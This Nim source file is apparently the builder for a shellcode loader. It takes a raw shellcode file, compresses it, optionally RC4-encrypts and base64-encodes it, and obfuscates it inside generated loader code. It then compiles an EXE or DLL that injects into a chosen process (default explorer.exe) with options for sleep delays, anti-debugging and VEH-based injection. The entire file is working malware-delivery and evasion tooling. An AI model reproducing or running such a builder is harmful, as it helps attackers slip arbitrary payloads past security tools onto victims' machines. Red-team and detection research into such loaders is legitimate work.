import RC4
import osproc
import argparse
import ptr_math
import strformat
import supersnappy
import winim/inc/[rpc, windef]
from std/base64 import encode


# YOU HAVE TO HAVE A TOOL BANNER
const pichichiBanner = """
"""

# Declare arguments
var shellcodePath: string
var injectionMethod: string
var processName: string
var outFormat: string
var outDllExportName: string  
var isSplit: bool
var sleepSeconds: string
var antiDebugg: string
var key: string
var isVeh: bool
var isDebug: bool
var isEncrypted: bool
var payload: string


# Define compiler args
var compileExeCmd = "nim compile --app:console"         # exe format
var compileDllCmd = "nim compile --app:lib --nomain"    # dll format
var compileExePath = " Loader/main.nim"                 # for source exe
var compileDllPath = " Loader/dll.nim"                  # for source dll
var compileOutExe = " -o:out.exe"                       # for compiled exe
var compileOutDll = " -o:out.dll"                       # for compiled dll
var compileFlags = " --cpu=amd64"                       # for windows 64 bit
compileFlags.add " -d:release -d:strip --opt:none"      # for minimal size   # --opt:size casuing runtime erros here!
compileFlags.add " --passL:-Wl,--dynamicbase"           # for relocation table (needed for loaders)
compileFlags.add " --benchmarkVM:on"                    # for NimProtect key randomization
compileFlags.add " --maxLoopIterationsVM:100000000"     # for RC4'ing big files


when isMainModule:
    # Define arguments
    var p = newParser:
        help(pichichiBanner)
        arg("raw-shellcode-file", help="Shellcode file to load")
        option("-n", "--process-name", help="Process name to inject (default: explorer.exe)", default=some("explorer.exe"))
        option("-f", "--format", help="Loader format", choices = @["exe", "dll"], default=some("exe"))
        option("-e", "--export", help="DLL export name (relevant only for Dll format)", default=some("DllRegisterServer"))
        flag("-p", "--split", help="Split and hide the payload blob in loader (takes long to compile!)")
        option("-t", "--sleep", help="Number of seconds to sleep before injection", default=some("0"))
        option("-g", "--anti-debug", help="Action to perform upon debugger detection", choices = @["none", "die", "troll"], default=some("none"))
        option("-k", "--key", help="RC4 key to [en/de]crypt the payload (supplied as a command line argument to the loader)", default=some(""))
        flag("-v", "--veh", help="Injection will occur within VEH")
        flag("-d", "--debug", help="Compile as debug instead of release (loader is verbose)")
    # Parse arguments
    try:
        var opts = p.parse()
        shellcodePath = opts.raw_shellcode_file
        processName = opts.process_name      
        outFormat = opts.format
        outDllExportName = opts.export
        isSplit = opts.split
        sleepSeconds = opts.sleep
        antiDebugg = opts.anti_debug
        key = opts.key
        isVeh = opts.veh
        isDebug = opts.debug
    except ShortCircuit as err:
        if err.flag == "argparse_help":
            echo err.help
            quit(1)
    except UsageError:
        echo pichichiBanner
        echo "[-] " & getCurrentExceptionMsg()
        echo "[i] Use -h / --help\n"
        quit(1)

    # Validate exe
    var shellcodeStr = readFile(shellcodePath)
    var shellcodeBytes = @(shellcodeStr.toOpenArrayByte(0, shellcodeStr.high))
    var shellcodeBytesPtr = addr shellcodeBytes[0]

    # Compress & encode exe payload
    var compressedShellcode = compress(shellcodeStr)

    # (Encrypt and) Encode payload if key supplied
    if key != "":
        payload = encode(toRC4(key, compressedShellcode))
        isEncrypted = true
    else:
        payload = encode(compressedShellcode)
        isEncrypted = false

    # Write the parameters to the loader params
    var paramsPath = "Loader/params.nim"
    var payloadLine: string
    if isSplit:
        payloadLine = fmt"""var payload* = splitString(protectString("{payload}"))"""
    else:
        payloadLine = fmt"""var payload* = protectString("{payload}")"""
    var paramsToLoader = fmt"""
import os
import nimprotect

{payloadLine}
var processName* = protectString("{processName}")
var dllExportName* = protectString("{outDllExportName}") 
var antiDebugAction* = protectString("{antiDebugg}")
var sleepSeconds* = {sleepSeconds}
var isVeh* = {isVeh}
var isEncrypted* = {isEncrypted}
    """
    writeFile(paramsPath, paramsToLoader)
        
    # Change to debug if needed
    if isDebug:
        compileFlags = compileFlags.replace("-d:release ", "")

    # Compile
    var compileCmd: string
    if outFormat == "exe":
        compileCmd = compileExeCmd & compileFlags & compileOutExe & compileExePath
    elif outFormat == "dll":
        # Write the dll file that contains the export function
        var nimDllPath = "Loader/dll.nim"
        var nimDllcontent = fmt"""
import main
import params

proc NimMain() {{.cdecl, importc.}}

proc {outDllExportName}(): void {{.stdcall, exportc, dynlib.}} =
    NimMain()
    main()
        """
        writeFile(nimDllPath, nimDllcontent)
        compileCmd = compileDllCmd & compileFlags & compileOutDll & compileDllPath
    echo "[*] Compiling Loader: " & compileCmd
    var res = execCmdEx(compileCmd, options={poStdErrToStdOut})
    if res[1] == 0:
        echo "[+] Compiled successfully"
        if key != "":
            echo fmt"[i] Run the loader with '-K:{key}' argument"
    else:
        echo "[-] Error compiling. compilation output:"
        echo res[0]


    
